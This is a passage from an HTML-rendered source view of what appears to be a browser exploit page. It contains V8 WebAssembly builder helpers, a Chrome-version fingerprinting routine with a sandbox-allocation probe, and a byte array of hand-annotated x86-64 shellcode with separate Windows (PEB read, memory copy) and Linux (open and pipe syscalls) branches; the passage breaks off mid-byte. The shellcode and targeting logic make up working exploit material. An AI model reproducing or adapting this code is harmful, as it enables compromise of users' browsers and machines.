value="2317"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2318"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2319"></td><td class="line-content">  function wasmF64Const(f) {</td></tr><tr><td class="line-number" value="2320"></td><td class="line-content">  // Write in little-endian order at offset 0.</td></tr><tr><td class="line-number" value="2321"></td><td class="line-content">  data_view.setFloat64(0, f, true);</td></tr><tr><td class="line-number" value="2322"></td><td class="line-content">  return [</td></tr><tr><td class="line-number" value="2323"></td><td class="line-content">    kExprF64Const, byte_view[0], byte_view[1], byte_view[2], byte_view[3],</td></tr><tr><td class="line-number" value="2324"></td><td class="line-content">    byte_view[4], byte_view[5], byte_view[6], byte_view[7]</td></tr><tr><td class="line-number" value="2325"></td><td class="line-content">  ];</td></tr><tr><td class="line-number" value="2326"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2327"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2328"></td><td class="line-content">  function wasmS128Const(f) {</td></tr><tr><td class="line-number" value="2329"></td><td class="line-content">  // Write in little-endian order at offset 0.</td></tr><tr><td class="line-number" value="2330"></td><td class="line-content">  if (Array.isArray(f)) {</td></tr><tr><td class="line-number" value="2331"></td><td class="line-content">    if (f.length != 16) throw new Error('S128Const needs 16 bytes');</td></tr><tr><td class="line-number" value="2332"></td><td class="line-content">    return [kSimdPrefix, kExprS128Const, ...f];</td></tr><tr><td class="line-number" value="2333"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2334"></td><td class="line-content">  let result = [kSimdPrefix, kExprS128Const];</td></tr><tr><td class="line-number" value="2335"></td><td class="line-content">  if (arguments.length === 2) {</td></tr><tr><td class="line-number" value="2336"></td><td class="line-content">    for (let j = 0; j &lt; 2; j++) {</td></tr><tr><td class="line-number" value="2337"></td><td class="line-content">      data_view.setFloat64(0, arguments[j], true);</td></tr><tr><td class="line-number" value="2338"></td><td class="line-content">      for (let i = 0; i &lt; 8; i++) result.push(byte_view[i]);</td></tr><tr><td class="line-number" value="2339"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2340"></td><td class="line-content">  } else if (arguments.length === 4) {</td></tr><tr><td class="line-number" value="2341"></td><td class="line-content">    for (let j = 0; j &lt; 4; j++) {</td></tr><tr><td class="line-number" value="2342"></td><td class="line-content">      data_view.setFloat32(0, arguments[j], true);</td></tr><tr><td class="line-number" value="2343"></td><td class="line-content">      for (let i = 0; i &lt; 4; i++) result.push(byte_view[i]);</td></tr><tr><td class="line-number" value="2344"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2345"></td><td class="line-content">  } else {</td></tr><tr><td class="line-number" value="2346"></td><td class="line-content">    throw new Error('S128Const needs an array of bytes, or two f64 values, ' +</td></tr><tr><td class="line-number" value="2347"></td><td class="line-content">                    'or four f32 values');</td></tr><tr><td class="line-number" value="2348"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2349"></td><td class="line-content">  return result;</td></tr><tr><td class="line-number" value="2350"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2351"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2352"></td><td class="line-content">  let [wasmBrOnCast, wasmBrOnCastFail] = (function() {</td></tr><tr><td class="line-number" value="2353"></td><td class="line-content">  return [</td></tr><tr><td class="line-number" value="2354"></td><td class="line-content">    (labelIdx, sourceType, targetType) =&gt;</td></tr><tr><td class="line-number" value="2355"></td><td class="line-content">      wasmBrOnCastImpl(labelIdx, sourceType, targetType, false),</td></tr><tr><td class="line-number" value="2356"></td><td class="line-content">      (labelIdx, sourceType, targetType) =&gt;</td></tr><tr><td class="line-number" value="2357"></td><td class="line-content">      wasmBrOnCastImpl(labelIdx, sourceType, targetType, true),</td></tr><tr><td class="line-number" value="2358"></td><td class="line-content">  ];</td></tr><tr><td class="line-number" value="2359"></td><td class="line-content">  function wasmBrOnCastImpl(labelIdx, sourceType, targetType, brOnFail) {</td></tr><tr><td class="line-number" value="2360"></td><td class="line-content">    labelIdx = wasmUnsignedLeb(labelIdx, kMaxVarInt32Size);</td></tr><tr><td class="line-number" value="2361"></td><td class="line-content">    let srcHeap = wasmSignedLeb(sourceType.heap_type, kMaxVarInt32Size);</td></tr><tr><td class="line-number" value="2362"></td><td class="line-content">    let tgtHeap = wasmSignedLeb(targetType.heap_type, kMaxVarInt32Size);</td></tr><tr><td class="line-number" value="2363"></td><td class="line-content">    let srcIsNullable = sourceType.opcode == kWasmRefNull;</td></tr><tr><td class="line-number" value="2364"></td><td class="line-content">    let tgtIsNullable = targetType.opcode == kWasmRefNull;</td></tr><tr><td class="line-number" value="2365"></td><td class="line-content">    flags = (tgtIsNullable &lt;&lt; 1) + srcIsNullable;</td></tr><tr><td class="line-number" value="2366"></td><td class="line-content">    return [</td></tr><tr><td class="line-number" value="2367"></td><td class="line-content">      kGCPrefix, brOnFail ? kExprBrOnCastFailGeneric : kExprBrOnCastGeneric,</td></tr><tr><td class="line-number" value="2368"></td><td class="line-content">      flags, ...labelIdx, ...srcHeap, ...tgtHeap];</td></tr><tr><td class="line-number" value="2369"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2370"></td><td class="line-content">  })();</td></tr><tr><td class="line-number" value="2371"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2372"></td><td class="line-content">  function getOpcodeName(opcode) {</td></tr><tr><td class="line-number" value="2373"></td><td class="line-content">  return globalThis.kWasmOpcodeNames?.[opcode] ?? 'unknown';</td></tr><tr><td class="line-number" value="2374"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2375"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2376"></td><td class="line-content">  // Make a wasm export "promising" using JS Promise Integration.</td></tr><tr><td class="line-number" value="2377"></td><td class="line-content">  function ToPromising(wasm_export) {</td></tr><tr><td class="line-number" value="2378"></td><td class="line-content">  let sig = wasm_export.type();</td></tr><tr><td class="line-number" value="2379"></td><td class="line-content">  assertTrue(sig.parameters.length &gt; 0);</td></tr><tr><td class="line-number" value="2380"></td><td class="line-content">  assertEquals('externref', sig.parameters[0]);</td></tr><tr><td class="line-number" value="2381"></td><td class="line-content">  let wrapper_sig = {</td></tr><tr><td class="line-number" value="2382"></td><td class="line-content">    parameters: sig.parameters.slice(1),</td></tr><tr><td class="line-number" value="2383"></td><td class="line-content">    results: ['externref']</td></tr><tr><td class="line-number" value="2384"></td><td class="line-content">  };</td></tr><tr><td class="line-number" value="2385"></td><td class="line-content">  return new WebAssembly.Function(</td></tr><tr><td class="line-number" value="2386"></td><td class="line-content">      wrapper_sig, wasm_export, {promising: 'first'});</td></tr><tr><td class="line-number" value="2387"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2388"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2389"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2390"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2391"></td><td class="line-content">  function evaluateSequentially(promises) {</td></tr><tr><td class="line-number" value="2392"></td><td class="line-content">        return promises.reduce(function(acc, f) {</td></tr><tr><td class="line-number" value="2393"></td><td class="line-content">            return acc.catch(function() { </td></tr><tr><td class="line-number" value="2394"></td><td class="line-content">                return new Promise(function(resolve, reject) {</td></tr><tr><td class="line-number" value="2395"></td><td class="line-content">                    f(function(r) {</td></tr><tr><td class="line-number" value="2396"></td><td class="line-content">                        if (r) {</td></tr><tr><td class="line-number" value="2397"></td><td class="line-content">                            resolve(r);</td></tr><tr><td class="line-number" value="2398"></td><td class="line-content">                        }</td></tr><tr><td class="line-number" value="2399"></td><td class="line-content">                        else {</td></tr><tr><td class="line-number" value="2400"></td><td class="line-content">                            reject();</td></tr><tr><td class="line-number" value="2401"></td><td class="line-content">                        }</td></tr><tr><td class="line-number" value="2402"></td><td class="line-content">                    });</td></tr><tr><td class="line-number" value="2403"></td><td class="line-content">                });</td></tr><tr><td class="line-number" value="2404"></td><td class="line-content">            });</td></tr><tr><td class="line-number" value="2405"></td><td class="line-content">        }, Promise.reject())</td></tr><tr><td class="line-number" value="2406"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2407"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2408"></td><td class="line-content">    function logic(version, s) {</td></tr><tr><td class="line-number" value="2409"></td><td class="line-content">        return function (cb) {</td></tr><tr><td class="line-number" value="2410"></td><td class="line-content">            if (!!(s &amp;&amp; s.constructor &amp;&amp; s.call &amp;&amp; s.apply)) {</td></tr><tr><td class="line-number" value="2411"></td><td class="line-content">                try {</td></tr><tr><td class="line-number" value="2412"></td><td class="line-content">                    s = s();</td></tr><tr><td class="line-number" value="2413"></td><td class="line-content">                }</td></tr><tr><td class="line-number" value="2414"></td><td class="line-content">                catch(e) {</td></tr><tr><td class="line-number" value="2415"></td><td class="line-content">                    s = false;</td></tr><tr><td class="line-number" value="2416"></td><td class="line-content">                }</td></tr><tr><td class="line-number" value="2417"></td><td class="line-content">            }</td></tr><tr><td class="line-number" value="2418"></td><td class="line-content">            if (s) {</td></tr><tr><td class="line-number" value="2419"></td><td class="line-content">                return cb(version);</td></tr><tr><td class="line-number" value="2420"></td><td class="line-content">            }</td></tr><tr><td class="line-number" value="2421"></td><td class="line-content">            cb(false);</td></tr><tr><td class="line-number" value="2422"></td><td class="line-content">        };</td></tr><tr><td class="line-number" value="2423"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2424"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2425"></td><td class="line-content">    function trycatch(version, f) {</td></tr><tr><td class="line-number" value="2426"></td><td class="line-content">        return function (cb) {</td></tr><tr><td class="line-number" value="2427"></td><td class="line-content">            try { </td></tr><tr><td class="line-number" value="2428"></td><td class="line-content">                f();</td></tr><tr><td class="line-number" value="2429"></td><td class="line-content">                // log(version, 'true');</td></tr><tr><td class="line-number" value="2430"></td><td class="line-content">                return cb(version); </td></tr><tr><td class="line-number" value="2431"></td><td class="line-content">            } catch(e) {</td></tr><tr><td class="line-number" value="2432"></td><td class="line-content">                // log(version, 'throw');</td></tr><tr><td class="line-number" value="2433"></td><td class="line-content">            }</td></tr><tr><td class="line-number" value="2434"></td><td class="line-content">            cb(false);</td></tr><tr><td class="line-number" value="2435"></td><td class="line-content">        };</td></tr><tr><td class="line-number" value="2436"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2437"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2438"></td><td class="line-content">    function srcdoc(version, src, f) {</td></tr><tr><td class="line-number" value="2439"></td><td class="line-content">        return function (cb) {</td></tr><tr><td class="line-number" value="2440"></td><td class="line-content">            var iframe = document.createElement('iframe');</td></tr><tr><td class="line-number" value="2441"></td><td class="line-content">            iframe.addEventListener('load', function() {</td></tr><tr><td class="line-number" value="2442"></td><td class="line-content">                try {</td></tr><tr><td class="line-number" value="2443"></td><td class="line-content">                    var res = f(iframe.contentDocument);</td></tr><tr><td class="line-number" value="2444"></td><td class="line-content">                    document.body.removeChild(iframe);</td></tr><tr><td class="line-number" value="2445"></td><td class="line-content">                    // log(version, res);</td></tr><tr><td class="line-number" value="2446"></td><td class="line-content">                    if (res) {</td></tr><tr><td class="line-number" value="2447"></td><td class="line-content">                        return cb(version);</td></tr><tr><td class="line-number" value="2448"></td><td class="line-content">                    }</td></tr><tr><td class="line-number" value="2449"></td><td class="line-content">                }</td></tr><tr><td class="line-number" value="2450"></td><td class="line-content">                catch(e) {}</td></tr><tr><td class="line-number" value="2451"></td><td class="line-content">                cb(false);</td></tr><tr><td class="line-number" value="2452"></td><td class="line-content">            });</td></tr><tr><td class="line-number" value="2453"></td><td class="line-content">            iframe.srcdoc = src;</td></tr><tr><td class="line-number" value="2454"></td><td class="line-content">            document.body.appendChild(iframe);</td></tr><tr><td class="line-number" value="2455"></td><td class="line-content">        };</td></tr><tr><td class="line-number" value="2456"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2457"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2458"></td><td class="line-content">    function ChromeVersionPromise() {</td></tr><tr><td class="line-number" value="2459"></td><td class="line-content">        function sandbox() {</td></tr><tr><td class="line-number" value="2460"></td><td class="line-content">            // Attempt to discern if the browser sandbox is enabled</td></tr><tr><td class="line-number" value="2461"></td><td class="line-content">            var b = [];</td></tr><tr><td class="line-number" value="2462"></td><td class="line-content">            try {</td></tr><tr><td class="line-number" value="2463"></td><td class="line-content">                for(var i = 0; i &lt; 64; i++) {</td></tr><tr><td class="line-number" value="2464"></td><td class="line-content">                    b.push(new ArrayBuffer(0x40000000));</td></tr><tr><td class="line-number" value="2465"></td><td class="line-content">                }</td></tr><tr><td class="line-number" value="2466"></td><td class="line-content">            } catch(e){}</td></tr><tr><td class="line-number" value="2467"></td><td class="line-content">            return {</td></tr><tr><td class="line-number" value="2468"></td><td class="line-content">                enabled: b.length == 15 ? false : (b.length &lt; 13 ? null : true),</td></tr><tr><td class="line-number" value="2469"></td><td class="line-content">                allocations: b.length,</td></tr><tr><td class="line-number" value="2470"></td><td class="line-content">            };</td></tr><tr><td class="line-number" value="2471"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="2472"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2473"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2474"></td><td class="line-content">        var secure = window.location.protocol == 'https:';</td></tr><tr><td class="line-number" value="2475"></td><td class="line-content">        return evaluateSequentially([</td></tr><tr><td class="line-number" value="2476"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D126 https://chromestatus.com/feature/5683933489989120</td></tr><tr><td class="line-number" value="2477"></td><td class="line-content">            logic(126, function() { return GeolocationCoordinates.prototype.toJSON != null; }),</td></tr><tr><td class="line-number" value="2478"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D125 https://chromestatus.com/feature/5586433790443520</td></tr><tr><td class="line-number" value="2479"></td><td class="line-content">            trycatch(125, function() { document.querySelector('body:state(foo)'); }),</td></tr><tr><td class="line-number" value="2480"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D124 https://chromestatus.com/feature/6560361081995264</td></tr><tr><td class="line-number" value="2481"></td><td class="line-content">            logic(124, function(){ return document.body.setHTMLUnsafe != null; }),</td></tr><tr><td class="line-number" value="2482"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D123 https://chromestatus.com/feature/6289894144212992</td></tr><tr><td class="line-number" value="2483"></td><td class="line-content">            srcdoc(123, </td></tr><tr><td class="line-number" value="2484"></td><td class="line-content">                "&lt;html&gt;&lt;style&gt;@keyframes slidein {from {transform: translateX(0%);}to {transform: translateX(100%);}}&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;",</td></tr><tr><td class="line-number" value="2485"></td><td class="line-content">                function(d) { return d.styleSheets[0].cssRules[0].length &gt; 0; }</td></tr><tr><td class="line-number" value="2486"></td><td class="line-content">            ),</td></tr><tr><td class="line-number" value="2487"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D122 https://chromestatus.com/feature/6280344932450304</td></tr><tr><td class="line-number" value="2488"></td><td class="line-content">            logic(122, function() { return Set.prototype.union != null; }),</td></tr><tr><td class="line-number" value="2489"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D121 https://chromestatus.com/feature/5069575759069184</td></tr><tr><td class="line-number" value="2490"></td><td class="line-content">            logic(121, function() { return Array.fromAsync != null; }),</td></tr><tr><td class="line-number" value="2491"></td><td class="line-content">            // https://caniuse.com/css-dir-pseudo</td></tr><tr><td class="line-number" value="2492"></td><td class="line-content">            trycatch(120, function() { document.querySelector('body:dir(ltr)'); }),</td></tr><tr><td class="line-number" value="2493"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D119 https://chromestatus.com/feature/5810984110784512</td></tr><tr><td class="line-number" value="2494"></td><td class="line-content">            logic(119, function() { return Promise.withResolvers != null; }),</td></tr><tr><td class="line-number" value="2495"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D118 https://chromestatus.com/feature/6389236793606144</td></tr><tr><td class="line-number" value="2496"></td><td class="line-content">            logic(118, function() { return new URL("http://example.com/%41").href == 'http://example.com/%41';}),</td></tr><tr><td class="line-number" value="2497"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D117 https://chromestatus.com/feature/5714791975878656</td></tr><tr><td class="line-number" value="2498"></td><td class="line-content">            logic(117, function() { return Object.groupBy != null; }),</td></tr><tr><td class="line-number" value="2499"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D116 https://chromestatus.com/feature/5202879349522432</td></tr><tr><td class="line-number" value="2500"></td><td class="line-content">            logic(116, function() { return AbortSignal.any != null; }),</td></tr><tr><td class="line-number" value="2501"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D115 https://chromestatus.com/feature/5099433642950656</td></tr><tr><td class="line-number" value="2502"></td><td class="line-content">            logic(115, function() { try { new WebAssembly.Module(new Uint8Array(4097)); } catch(e) { if (e.toString().indexOf('magic word') &gt;= 0) return true; }}),</td></tr><tr><td class="line-number" value="2503"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D114 https://chromestatus.com/feature/5121582673428480</td></tr><tr><td class="line-number" value="2504"></td><td class="line-content">            trycatch(114, function() { eval('JSON.parse(" 9999999999999999", (key, val, {source}) =&gt; BigInt(source))'); }), // evaled due to use of destructuing</td></tr><tr><td class="line-number" value="2505"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D113 https://chromestatus.com/feature/5184534394437632</td></tr><tr><td class="line-number" value="2506"></td><td class="line-content">            logic(113, function() { return Headers.prototype.getSetCookiesecure != null }),</td></tr><tr><td class="line-number" value="2507"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D112 https://chromestatus.com/feature/5066604734316544</td></tr><tr><td class="line-number" value="2508"></td><td class="line-content">            logic(112, function() { try { new FormData(document.createElement('form'), document.createElement('button')); } catch(e) { if(e.toString().indexOf('specified element is not owned by this form element') &gt;= 0) return true; } }),</td></tr><tr><td class="line-number" value="2509"></td><td class="line-content">            // https://caniuse.com/css-nth-child-of</td></tr><tr><td class="line-number" value="2510"></td><td class="line-content">            trycatch(111, function() { document.querySelector('body:nth-child(1 of .foo)') }),</td></tr><tr><td class="line-number" value="2511"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D110 https://chromestatus.com/feature/5190163462881280</td></tr><tr><td class="line-number" value="2512"></td><td class="line-content">            logic(110, function() { return AudioContext.prototype.setSinkId != null; }),</td></tr><tr><td class="line-number" value="2513"></td><td class="line-content">            // https://caniuse.com/mathml</td></tr><tr><td class="line-number" value="2514"></td><td class="line-content">            srcdoc(109,</td></tr><tr><td class="line-number" value="2515"></td><td class="line-content">                "&lt;html&gt;&lt;body&gt;&lt;math display='inline'&gt;&lt;mrow&gt;&lt;munderover&gt;&lt;mo&gt;&lt;/mo&gt;&lt;mrow&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;&lt;/mn&gt;&lt;/mrow&gt;&lt;/munderover&gt;&lt;mfrac&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;msup&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msup&gt;&lt;/mfrac&gt;&lt;/mrow&gt;&lt;/math&gt;&lt;/body&gt;&lt;/html&gt;",</td></tr><tr><td class="line-number" value="2516"></td><td class="line-content">                function(d) { if (d.querySelector('math').clientHeight &gt; 10) return true; return false; }</td></tr><tr><td class="line-number" value="2517"></td><td class="line-content">            ),</td></tr><tr><td class="line-number" value="2518"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D108 https://chromestatus.com/feature/4906826915643392</td></tr><tr><td class="line-number" value="2519"></td><td class="line-content">            logic(108, function() { return window.defaultstatus == null; }),</td></tr><tr><td class="line-number" value="2520"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D107 https://chromestatus.com/feature/5206436850696192</td></tr><tr><td class="line-number" value="2521"></td><td class="line-content">            trycatch(107, function() { new URLPattern("https://example.com/XXX", {ignoreCase: true}); }),</td></tr><tr><td class="line-number" value="2522"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D106 https://chromestatus.com/feature/5707621009981440</td></tr><tr><td class="line-number" value="2523"></td><td class="line-content">            logic(106, function() { return Intl.NumberFormat().formatRange != null; }),</td></tr><tr><td class="line-number" value="2524"></td><td class="line-content">            // https://caniuse.com/css-has</td></tr><tr><td class="line-number" value="2525"></td><td class="line-content">            trycatch(105, function() { document.querySelector('body:has(img)') }),</td></tr><tr><td class="line-number" value="2526"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D104 https://chromestatus.com/feature/4814886323355648</td></tr><tr><td class="line-number" value="2527"></td><td class="line-content">            logic(104, function() { return document.createElement('canvas').getContext('webgl2').drawingBufferColorSpace != null; }),</td></tr><tr><td class="line-number" value="2528"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D103 https://chromestatus.com/feature/5768400507764736</td></tr><tr><td class="line-number" value="2529"></td><td class="line-content">            logic(103, function() { return AbortSignal.timeout != null; }),</td></tr><tr><td class="line-number" value="2530"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D102 https://chromestatus.com/feature/6232287446302720 </td></tr><tr><td class="line-number" value="2531"></td><td class="line-content">            logic(102, function() { return navigator.mediaDevices.setCaptureHandleConfig != null; }),</td></tr><tr><td class="line-number" value="2532"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D101 https://chromestatus.com/feature/5640127995969536</td></tr><tr><td class="line-number" value="2533"></td><td class="line-content">            logic(101, function() { return USBDevice.prototype.forget != null; }),</td></tr><tr><td class="line-number" value="2534"></td><td class="line-content">            // https://chromestatus.com/features#milestone%3D100 https://chromestatus.com/feature/5029737100476416</td></tr><tr><td class="line-number" value="2535"></td><td class="line-content">            logic(100, function() { return AbortSignal.prototype.throwIfAborted != null; }),</td></tr><tr><td class="line-number" value="2536"></td><td class="line-content">            // https://caniuse.com/webtransport</td></tr><tr><td class="line-number" value="2537"></td><td class="line-content">            logic(97, secure &amp;&amp; typeof WebTransport != 'undefined'),</td></tr><tr><td class="line-number" value="2538"></td><td class="line-content">            // https://caniuse.com/webcodecs</td></tr><tr><td class="line-number" value="2539"></td><td class="line-content">            logic(94, typeof EncodedAudioChunk != 'undefined'),</td></tr><tr><td class="line-number" value="2540"></td><td class="line-content">            // https://caniuse.com/cookie-store-api</td></tr><tr><td class="line-number" value="2541"></td><td class="line-content">            logic(87, secure &amp;&amp; typeof CookieStore != 'undefined'),</td></tr><tr><td class="line-number" value="2542"></td><td class="line-content">            // https://caniuse.com/wake-lock</td></tr><tr><td class="line-number" value="2543"></td><td class="line-content">            logic(84, secure &amp;&amp; typeof WakeLock != 'undefined'),</td></tr><tr><td class="line-number" value="2544"></td><td class="line-content">            // https://caniuse.com/webxr</td></tr><tr><td class="line-number" value="2545"></td><td class="line-content">            logic(79, typeof navigator.xr != 'undefined'),</td></tr><tr><td class="line-number" value="2546"></td><td class="line-content">            // https://caniuse.com/bigint</td></tr><tr><td class="line-number" value="2547"></td><td class="line-content">            logic(67, typeof BigInt != 'undefined'),</td></tr><tr><td class="line-number" value="2548"></td><td class="line-content">            // https://caniuse.com/object-values</td></tr><tr><td class="line-number" value="2549"></td><td class="line-content">            logic(54, typeof Object.values != 'undefined'),</td></tr><tr><td class="line-number" value="2550"></td><td class="line-content">            // https://caniuse.com/proxy</td></tr><tr><td class="line-number" value="2551"></td><td class="line-content">            logic(49, typeof Proxy != 'undefined'),</td></tr><tr><td class="line-number" value="2552"></td><td class="line-content">            // https://caniuse.com/hardwareconcurrency</td></tr><tr><td class="line-number" value="2553"></td><td class="line-content">            logic(37, typeof navigator.hardwareConcurrency != 'undefined'),</td></tr><tr><td class="line-number" value="2554"></td><td class="line-content">            // https://caniuse.com/promises</td></tr><tr><td class="line-number" value="2555"></td><td class="line-content">            logic(22, typeof Promise != 'undefined'),</td></tr><tr><td class="line-number" value="2556"></td><td class="line-content">            function(cb) { cb(null); }</td></tr><tr><td class="line-number" value="2557"></td><td class="line-content">        ]).then(function(version) {</td></tr><tr><td class="line-number" value="2558"></td><td class="line-content">            return {</td></tr><tr><td class="line-number" value="2559"></td><td class="line-content">                'Chrome' : version ? 'Chrome' + version + '+' : 'Unknown',</td></tr><tr><td class="line-number" value="2560"></td><td class="line-content">            };</td></tr><tr><td class="line-number" value="2561"></td><td class="line-content">        });</td></tr><tr><td class="line-number" value="2562"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2563"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2564"></td><td class="line-content">let iomem = new Uint8Array(8192);</td></tr><tr><td class="line-number" value="2565"></td><td class="line-content">iomem.set([</td></tr><tr><td class="line-number" value="2566"></td><td class="line-content">    // 0xcc,</td></tr><tr><td class="line-number" value="2567"></td><td class="line-content">    0x41, 0x8c, 0xec,                        // 00: MOV r12d, gs</td></tr><tr><td class="line-number" value="2568"></td><td class="line-content">0x4d, 0x85, 0xe4,                        // 01: TEST r12, r12</td></tr><tr><td class="line-number" value="2569"></td><td class="line-content">0x0f, 0x84, 0x3b, 0x00, 0x00, 0x00,      // 02: JZ :Linux =&gt; 0x0047</td></tr><tr><td class="line-number" value="2570"></td><td class="line-content">// Windows shellcode</td></tr><tr><td class="line-number" value="2571"></td><td class="line-content">0x49, 0x89, 0xc4,                        // 03: MOV r12, rax</td></tr><tr><td class="line-number" value="2572"></td><td class="line-content">0x48, 0x31, 0xc9,                        // 04: XOR rcx, rcx</td></tr><tr><td class="line-number" value="2573"></td><td class="line-content">0x65, 0x48, 0x8b, 0x41, 0x60,            // 05: MOV(rax, gs:[rcx+0x60])</td></tr><tr><td class="line-number" value="2574"></td><td class="line-content">0x48, 0x8b, 0x40, 0x20,                  // 06: MOV rax, [rax + 32]</td></tr><tr><td class="line-number" value="2575"></td><td class="line-content">0x66, 0x8b, 0x48, 0x70,                  // 07: MOV cx, [rax + 112]</td></tr><tr><td class="line-number" value="2576"></td><td class="line-content">0x48, 0x8b, 0x40, 0x78,                  // 08: MOV rax, [rax + 120]</td></tr><tr><td class="line-number" value="2577"></td><td class="line-content">// loop [0x0023]:</td></tr><tr><td class="line-number" value="2578"></td><td class="line-content">0x44, 0x8a, 0x18,                        // 09: MOV r11b, [rax]</td></tr><tr><td class="line-number" value="2579"></td><td class="line-content">0x45, 0x88, 0x1c, 0x24,                  // 10: MOV [r12], r11b</td></tr><tr><td class="line-number" value="2580"></td><td class="line-content">0x48, 0xff, 0xc0,                        // 11: INC rax</td></tr><tr><td class="line-number" value="2581"></td><td class="line-content">0x49, 0xff, 0xc4,                        // 12: INC r12</td></tr><tr><td class="line-number" value="2582"></td><td class="line-content">0x48, 0xff, 0xc9,                        // 13: DEC rcx</td></tr><tr><td class="line-number" value="2583"></td><td class="line-content">0x48, 0x85, 0xc9,                        // 14: TEST rcx, rcx</td></tr><tr><td class="line-number" value="2584"></td><td class="line-content">0x0f, 0x85, 0xe7, 0xff, 0xff, 0xff,      // 15: JNZ :loop =&gt; 0x0023</td></tr><tr><td class="line-number" value="2585"></td><td class="line-content">0x68, 0x00, 0x02, 0x00, 0x00,            // 16: PUSH 512</td></tr><tr><td class="line-number" value="2586"></td><td class="line-content">0x58,                                    // 17: POP rax</td></tr><tr><td class="line-number" value="2587"></td><td class="line-content">0xe9, 0x11, 0x02, 0x00, 0x00,            // 18: JMP :return =&gt; 0x0258</td></tr><tr><td class="line-number" value="2588"></td><td class="line-content">// Linux [0x0047]:</td></tr><tr><td class="line-number" value="2589"></td><td class="line-content">0x49, 0x89, 0xc4,                        // 19: MOV r12, rax</td></tr><tr><td class="line-number" value="2590"></td><td class="line-content">0x68, 0x2f, 0x00, 0x00, 0x2f,            // 20: PUSH 788529199</td></tr><tr><td class="line-number" value="2591"></td><td class="line-content">0x31, 0xd2,                              // 21: XOR edx, edx</td></tr><tr><td class="line-number" value="2592"></td><td class="line-content">0x31, 0xf6,                              // 22: XOR esi, esi</td></tr><tr><td class="line-number" value="2593"></td><td class="line-content">0x48, 0x89, 0xe7,                        // 23: MOV rdi, rsp</td></tr><tr><td class="line-number" value="2594"></td><td class="line-content">0xb8, 0x02, 0x00, 0x00, 0x00,            // 24: MOV eax, 2</td></tr><tr><td class="line-number" value="2595"></td><td class="line-content">0x0f, 0x05,                              // 25: SYSCALL</td></tr><tr><td class="line-number" value="2596"></td><td class="line-content">0x5f,                                    // 26: POP rdi</td></tr><tr><td class="line-number" value="2597"></td><td class="line-content">0x48, 0xc1, 0xe8, 0x3f,                  // 27: SHR rax, 63</td></tr><tr><td class="line-number" value="2598"></td><td class="line-content">0x85, 0xc0,                              // 28: TEST eax, eax</td></tr><tr><td class="line-number" value="2599"></td><td class="line-content">0x0f, 0x85, 0xee, 0x01, 0x00, 0x00,      // 29: JNZ :return =&gt; 0x0258</td></tr><tr><td class="line-number" value="2600"></td><td class="line-content">0x4c, 0x89, 0xe0,                        // 30: MOV rax, r12</td></tr><tr><td class="line-number" value="2601"></td><td class="line-content">0x48, 0x89, 0xc3,                        // 31: MOV rbx, rax</td></tr><tr><td class="line-number" value="2602"></td><td class="line-content">// pipe(link)</td></tr><tr><td class="line-number" value="2603"></td><td class="line-content">0x6a, 0x00,                              // 32: PUSH 0</td></tr><tr><td class="line-number" value="2604"></td><td class="line-content">0xb8, 0x16, 0x00, 0x00, 0x00,            // 33: MOV eax, 22</td></tr><tr><td class="line-number" value="2605"></td><td class="line-content">0x48, 0x89, 0xe7,                        // 34: MOV rdi, rsp</td></tr><tr><td class="line-number" value="2606"></td><td class="line-content">0x0f, 